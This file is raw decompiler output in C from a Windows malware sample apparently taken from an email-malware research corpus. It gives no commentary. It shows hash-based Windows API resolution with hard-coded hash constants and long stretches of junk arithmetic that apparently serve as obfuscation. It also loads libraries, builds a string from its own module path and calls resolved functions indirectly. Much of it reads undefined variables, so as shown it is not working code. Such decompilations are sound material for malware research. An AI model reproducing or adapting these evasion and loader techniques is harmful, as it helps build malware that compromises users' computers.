// subject.c
// Generated on 5/4/2015 12:20:28 AM by decompiling malware_via_email/malware_0090/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn00401000(int32 dwArg04, word32 dwArg08)
{
	Eq_3 * eax_76 = (dwArg04->dw003C + dwArg04)->dw0078 + dwArg04;
	word16 * eax_80[] = eax_76->dw0024 + dwArg04;
	uint32 ebx_118 = dwArg08;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		ebx_118 = dwArg08 + 0x000D9813;
	word32 * eax_122[] = eax_76->dw0020 + dwArg04;
	word32 * eax_127[] = eax_76->dw001C + dwArg04;
	int32 edx_129 = 0x00000000;
	word32 eax_165;
	while (edx_129 < eax_76->dw0018)
	{
		word32 eax_210 = eax_122[edx_129] + dwArg04;
		dwLoc3C = dwLoc3C & 0x00000000;
		dwLoc40 = dwLoc40 & 0x00000000;
		while (dwLoc3C->b0000 != 0x00)
		{
			dwLoc40 = (int32) dwLoc3C->b0000 ^ 0x00000021 ^ (dwLoc40 << 0x00000007 | dwLoc40 >>u 0x00000019);
			dwLoc3C = dwLoc3C + 0x00000001;
		}
		if (dwLoc40 == ebx_118)
		{
			eax_165 = eax_127[(word32) eax_80[edx_129]] + dwArg04;
			goto l00401288;
		}
		edx_129 = edx_129 + 0x00000001;
	}
	eax_165 = 0x00000000;
l00401288:
	return eax_165;
}

byte fn00401291()
{
	GetModuleHandleA(0x00000000);
	word32 ecx_27 = -(dwLoc10 << 0x00000003) + dwLoc08;
	ui32 ecx_53 = dwLoc0C + ((dwLoc0C * 0x00000002 + 0x000000D5) + dwLoc10 * 0x00000004 & dwLoc0C + 0x00000B3E ^ ecx_27 + 0x000015B3 >>u (byte) ecx_27 & dwLoc0C * 0x00000002 | ((dwLoc10 * 0x00000002 | dwLoc0C * 0x00000002) | dwLoc08 * 0x00000008 + 0x000002E6));
	ui32 eax_69 = dwLoc08 * 0x00000002 >>u (byte) ((dwLoc08 * 0x00000002) *s (dwLoc08 * 0x00000002)) & ecx_53 * 0x00000002 << (byte) ecx_53;
	uint8 cl_78 = (byte) eax_69;
	ui32 edx_84 = dwLoc08 * 0x00000003 + eax_69 * 0x00000004 + 0x00001E95 >>u cl_78 >>u cl_78 | dwLoc0C * 0x00000002 + 0x000000E8;
	word32 edx_98 = dwLoc0C + 0x00000198 + (((dwLoc08 + 0x000002CF) + dwLoc08) *s ((edx_84 + 0x00001533) + edx_84)) *s (dwLoc0C + 0x00001C27);
	byte cl_101 = (byte) (dwLoc0C + 0x0000004B + dwLoc0C);
	Mem0[0x00404214:word32]();
	ui32 eax_103 = edx_98 << cl_101;
	uint8 cl_127 = (byte) eax_103;
	word32 edi_131 = dwLoc0C + edx_84;
	word32 edi_140 = edx_84 * 0x00000002 + 0x00000091;
	ui32 ebx_149 = dwLoc0C << 0x00000003 << cl_127;
	byte cl_153 = (byte) ((dwLoc0C + 0x000000A2 + dwLoc0C ^ (edx_84 + 0x00000793 ^ (edi_131 + 0x00000012) + edi_131) ^ ((dwLoc0C << 0x00000003) + 0x0000170A & eax_103 * 0x00000002) & edi_140 | edx_84 * 0x00000002 & eax_103 * 0x00000002) * 0x00000002 * 0x00000002);
	word32 ecx_157 = 0x00000000 - eax_103 * 0x00000002;
	uint32 edx_148 = eax_103 + 0x00000B34 >>u cl_127;
	Mem0[0x00404218:word32]();
	ui32 eax_159 = ebx_149 << cl_153 & ecx_157 | edx_148;
	globals->dw40421C = 0x00010007;
	word32 ecx_182 = eax_159 * 0x00000002 + (eax_103 << 0x00000002);
	ui32 ecx_202 = ecx_182 + 0x0000002D >>u (byte) ecx_182 << (byte) ((eax_103 << 0x00000002) + 0x000026C8) & eax_159 * 0x00000002 & (eax_159 * 0x00000002 + 0x0000209C) *s (eax_159 * 0x00000002 + 0x00000094) ^ ((eax_159 << 0x00000003) + 0x00000B73) + dwLoc0C * 0x00000008 ^ eax_103 + 0x000017C2;
	word32 ecx_209 = ecx_202 * 0x00000002 - eax_159 * 0x00000002;
	byte cl_210 = (byte) ecx_209;
	ui32 edi_212 = ecx_209 + 0x000000A5 << cl_210;
	uint32 edx_221 = eax_159 * 0x00000002 >>u (byte) ((-(ecx_202 << 0x00000002) + eax_159 * 0x00000002) + 0x000005E6);
	byte cl_225 = (byte) (eax_159 * 0x00000005 + 0x00002701);
	word32 esi_214 = dwLoc0C * 0x00000002 << cl_210 & edi_212;
	ui32 eax_228 = edx_221 << cl_225 ^ esi_214;
	Mem204[0x004044E8:word32]();
	globals->dw4042D4 = 0x004015FE;
	Mem261[0x004044EC:word32]();
	byte cl_300 = (byte) ((ecx_202 << 0x00000003) + 0x00002284 + eax_228 * 0x00000002);
	Mem261[0x004044F0:word32]();
	return cl_300;
}

void fn00402001(uint8 cl)
{
	int32 eax_19 = LoadLibraryA(globals->t404018);
	CloseHandle(0x00000055);
	globals->ptr404A18 = fn00401000(eax_19, 0xF94F773D);
	ui32 eax_48 = dwLoc10 << 0x00000003 >>u cl & dwLoc10 * 0x00000002 + 0x00000039 & dwLoc08 + 0x00001644 ^ dwLoc0C * 0x00000004 + 0x0000116D & dwLoc08 + 0x00001E6B ^ (dwLoc10 << 0x00000002) + 0x000011DD | 0x00000000 >>u (byte) (dwLoc10 << 0x00000002);
	GetFileType(0x0000002E);
	GetModuleHandleA(0x00000000);
	globals->ptr404214 = fn00401000(eax_19, 0x25C1455C);
	word32 ecx_74 = -(dwLoc08 * 0x00000002 *s ((dwLoc0C * 0x00000004 + 0x0000205D) *s dwLoc08 << 0x00000003)) + eax_48 * 0x00000002 + dwLoc0C * 0x00000002;
	globals->ptr404218 = fn00401000(eax_19, 0x117F004B);
	int32 eax_84 = ecx_74 + 0x000000C1 << (byte) ecx_74 ^ eax_48 * 0x00000002 & -(eax_48 * 0x00000002 + 0x00000074) + eax_48 * 0x00000002;
	globals->ptr4044E8 = fn00401000(eax_19, 0x15635F51);
	globals->ptr4044EC = fn00401000(eax_19, 0x15637751);
	ui32 eax_123 = eax_84 << 0x00000003 & (eax_84 << 0x00000002) >>u (byte) (dwLoc08 + 0x00001756) | (((((eax_84 << 0x00000002) + 0x00001E36) *s eax_84) * 0x00000002) * 0x00000002) *s ((dwLoc08 + 0x000000FF) + dwLoc08) + (dwLoc0C << 0x00000003) ^ dwLoc0C << 0x00000003;
	uint8 cl_158 = (byte) (0xFFFFF151 - dwLoc08);
	globals->ptr4044F0 = fn00401000(eax_19, 0xCEE642C0);
	ui32 eax_173 = -(dwLoc08 * 0x00000002 * 0x00000002) + (eax_123 * 0x00000002) * 0x00000002 | ((0x00000000 >>u cl_158) >>u cl_158 | 0x00000000 << (byte) (dwLoc08 * 0x00000004 + 0x00002146 & eax_123 + 0x00002641 | dwLoc08 + 0x000012CA & eax_123 * 0x00000008 + 0x000004AB));
	globals->ptr404A08 = fn00401000(eax_19, 0xF2D74466);
	globals->ptr404A1C = fn00401000(eax_19, 0x20FAF6E2);
	ui32 eax_203 = eax_173 + 0x0000179C ^ (eax_173 + 0x0000075C) + eax_173 >>u (byte) ((eax_173 << 0x00000002) + 0x00000BA3) | ((eax_173 << 0x00000002) + 0x0000004C | (eax_123 * 0x00000002 - (eax_173 << 0x00000003)) + 0xFFFFDD3B);
	globals->ptr4044F4 = fn00401000(eax_19, 0x7DC27DDD);
	GetModuleFileNameA(0x00000000, 0x00404A20, 0x00000104);
	lstrcpyA(0x00404904, globals->t40402C);
	ui32 eax_242 = eax_203 * 0x00000008 + 0x00001C3D & eax_203 + 0x0000068E << (byte) (eax_203 * 0x00000002 + 0x0000002C) | ((eax_173 * 0x00000002 + 0x000007E5) *s ((eax_123 + 0x0000003F) + eax_123) << (byte) (eax_173 * 0x00000002) & eax_123 + 0x0000150C | eax_203 + 0x00000432 << (byte) (eax_123 + 0x0000150C));
	lstrcatA(0x00404904, globals->t404000);
	ui32 eax_322 = eax_242 + 0x0000098D + (-((eax_123 + 0x000000DC) + eax_123) + eax_242 * 0x00000002) | (eax_123 << 0x00000002 ^ eax_242 << 0x00000002 & eax_123 << 0x00000002 | eax_242 + 0x00001DF0);
	ui32 eax_288 = eax_242 + 0x0000035D ^ eax_123 * 0x00000002 + 0x0000002A & (eax_123 * 0x00000002 >>u (byte) (-((eax_123 * 0x00000003 + 0xFFFFDFF4 & eax_123 << 0x00000002) * 0x00000002) + eax_123 * 0x00000002)) << (byte) (eax_242 << 0x00000002) ^ eax_123 * 0x00000002 + 0x000000D7;
	lstrcatA(0x00404904, globals->t404014);
	ui32 eax_355 = eax_123 * 0x00000002 * 0x00000002 - (eax_123 * 0x00000002 + 0x00000048) + eax_322 * 0x00000002 >>u (byte) (((eax_123 << 0x00000003) - eax_322 * 0x00000002) + 0x000006FA) | (eax_123 + 0x00000066 >>u (byte) (eax_322 * 0x00000002) | eax_288 * 0x00000002) | eax_123 * 0x00000002 + (eax_123 << 0x00000003);
	ui32 eax_381 = eax_123 * 0x00000002 | (eax_123 * 0x00000002 ^ eax_288 * 0x00000002) ^ eax_123 * 0x00000002 | ((eax_355 + 0x000018F2) + eax_355) *s ((eax_288 << 0x00000003) + 0x00000AA7) & eax_123 * 0x00000002 | eax_288 << 0x00000003 | eax_288 * 0x00000002 + 0x0000139D;
	lstrcatA(0x00404904, 0x00404A20);
	byte cl_400 = (byte) (-(eax_381 * 0x00000002) + eax_355 * 0x00000002 + 0x00000030);
	globals->dw404B24 = 0x00000044;
	ui32 eax_408 = eax_355 * 0x00000002 * 0x00000002 & (eax_355 + 0x000004D8 << (byte) (eax_288 * 0x00000002)) << cl_400 & eax_355 * 0x00000002 << cl_400;
	ui32 ecx_443 = -(eax_408 << 0x00000003) + (eax_381 * 0x00000002) * 0x00000002 + eax_381 * 0x00000002 + 0x00000D7A | eax_355 * 0x00000002 >>u (byte) (((eax_408 << 0x00000002) - eax_408 * 0x00000002) + 0x000008A8) | eax_355 * 0x00000002 + 0x000016F5 ^ eax_408 * 0x00000002;
	globals->dw404B50 = 0x00000001;
	word32 ecx_456 = ecx_443 * 0x00000002 + 0x000001A4 + ecx_443 * 0x00000004 ^ (eax_408 << 0x00000002) >>u (byte) ecx_443 | 0xFFFFFF17 - eax_355 * 0x00000002;
	globals->w404B54 = 0x0002;
	uint8 cl_457 = (byte) ecx_456;
	ui32 eax_461 = (eax_355 << 0x00000003) - (eax_355 * 0x00000002) *s (eax_355 * 0x00000002) | ecx_456;
	int32 eax_474 = 0x00000000 >>u cl_457 >>u cl_457 | (eax_461 + 0x000003DE) + eax_461;
	ui32 esi_501 = eax_461 * 0x00000002 * 0x00000002;
	word32 ecx_502 = ecx_443 * 0x00000002 + 0x00002349 + eax_474 * 0x00000002 - (eax_474 << 0x00000003) - esi_501;
	byte cl_503 = (byte) ecx_502;
	word32 edx_505 = (eax_474 << 0x00000003) + 0x00001D25;
	word32 eax_506 = ((ecx_443 << 0x00000003) + 0x000005B7) *s (ecx_443 * 0x00000002) >>u (byte) (ecx_443 << 0x00000003) << (byte) (eax_474 * 0x00000002) << cl_503 ^ edx_505;
	Mem476[0x00404A18:word32]();
	uint32 edi_540 = eax_506 + 0x000011AE >>u (byte) ((ecx_443 - ecx_443 * 0x00000002) + 0x00001DB2);
	uint8 cl_548 = (byte) (eax_474 *s (((eax_474 * 0x00000002 + 0x00000017) *s (ecx_443 * 0x00000002)) *s (eax_474 * 0x00000002)) * 0x00000002 * 0x00000002);
	word32 edx_551 = eax_474 * 0x00000002 & ecx_443 * 0x00000002;
	int32 eax_552 = edi_540 >>u cl_548 ^ edx_551;
	Mem476[0x004044F4:word32]();
	globals->ptr4048F8 = fn00401000(eax_552, 0x00311330);
	ui32 eax_567 = eax_474 * 0x00000002 + ((eax_474 * 0x00000002) *s eax_552) * 0x00000004 ^ ecx_443 * 0x00000002 & eax_474 * 0x00000002;
	globals->ptr4048FC = fn00401000(eax_552, 0xBF27C02C);
	word32 ecx_584 = eax_567 * 0x00000002 + 0x000000F8;
	ui32 eax_599 = eax_567 + 0x000018F6 & ((eax_567 + 0x00001BE4 << (byte) ecx_584 & ((eax_474 + 0x00003E8D) + eax_567 * 0x00000004 >>u (byte) eax_474 & ecx_584)) & eax_474 + 0x000026C2 << (byte) (ecx_443 * 0x00000002));
	globals->ptr404900 = fn00401000(eax_552, 0x07030218);
	word32 ecx_617 = eax_474 * 0x00000002 * 0x00000002 ^ eax_599 * 0x00000002 + 0x00000D00;
	globals->ptr404A0C = fn00401000(eax_552, 0xA55F961C);
	ui32 eax_629 = eax_599 + 0x0000052A | ecx_617 | eax_599 * 0x00000002 - (eax_474 * 0x00000002 + 0x000000D5) ^ ((eax_599 * 0x00000002) *s (eax_474 * 0x00000002) ^ 0x00000000 >>u (byte) ecx_617);
	globals->ptr404A14 = fn00401000(eax_552, 0x9CCB447A);
	word32 eax_662 = eax_599 << 0x00000003 & (eax_629 + 0x000009C7 << (byte) eax_474) << (byte) (eax_474 + 0x0000049F) ^ eax_629 + 0x00000D54 ^ eax_474 * 0x00000002 | eax_629 * 0x00000002 ^ eax_474 * 0x00000002 << (byte) (eax_629 << 0x00000002);
	ui32 ecx_709 = eax_629 + eax_599;
	ui32 eax_683 = eax_599 * 0x00000002 + 0x000000BF + (eax_599 << 0x00000002) - ((eax_662 + 0x00000088) + eax_662) ^ ((eax_599 << 0x00000002) + 0x00001157) + eax_629;
	uint8 cl_718 = (byte) (eax_599 + 0x00001F18);
	uint32 edx_714 = ecx_709 * 0x00000002 >>u (byte) ecx_709;
	word32 esi_708 = eax_629 * 0x00000002 + eax_683 * 0x00000004 & eax_629 * 0x00000002 + 0x000000A7 ^ (eax_683 + 0x00000782) + eax_683 & eax_599 * 0x00000002;
	int32 eax_722 = 0x00000000 >>u cl_718 ^ edx_714 | esi_708;
	Mem693[0x004044F4:word32]();
	globals->ptr404A10 = fn00401000(eax_722, 0xE0753562);
	fn00401291();
	Mem760[0x00404A1C:word32]();
	return;
}

